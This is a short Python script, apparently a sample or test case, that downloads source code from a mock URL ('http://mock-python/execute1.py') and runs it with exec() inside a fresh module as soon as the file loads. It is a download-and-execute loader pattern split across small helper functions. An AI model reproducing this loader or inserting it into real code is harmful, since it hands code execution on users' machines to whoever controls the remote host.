import urllib.request
import types

def get_url():
    return "http://mock-python/execute1.py"

def get_response(url):
    with urllib.request.urlopen(url) as response:
        source = response.read().decode('utf-8')
    return source

def create_module():
    return types.ModuleType("sm1")

def execute_code(src, module):
    exec(src, module.__dict__)

def main():
    url = get_url()
    source = get_response(url)
    module = create_module()
    execute_code(source, module)

main()
